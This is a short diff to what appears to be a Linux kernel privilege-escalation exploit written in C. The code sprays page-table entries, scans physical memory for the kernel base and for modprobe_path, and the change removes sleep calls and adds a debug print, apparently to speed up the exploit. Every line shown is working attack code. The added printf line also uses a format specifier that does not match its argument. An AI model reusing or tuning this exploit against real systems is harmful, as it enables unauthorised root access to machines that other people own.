@@ -357,7 +357,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
-
+		printf("%d",i);
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
@@ -391,7 +391,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
 	{
 		unsigned long long kernel_iteration_base;
-		sleep(1);
 		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);
 
 		PRINTF_VERBOSE("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
@@ -404,7 +403,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		for (unsigned long long j=0; j < 512; j++) 
 		{
 			unsigned long long phys_kernel_base;
-			sleep(1);
 			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
 			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
 			// - it's different per architecture and per compiler (clang produces different signature than gcc)
@@ -423,7 +421,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
 			for (int i=0; i < 40; i++) 
 			{
-				sleep(1);
 				void *pmd_modprobe_addr;
 				unsigned long long phys_modprobe_addr;
 				unsigned long long modprobe_iteration_base;
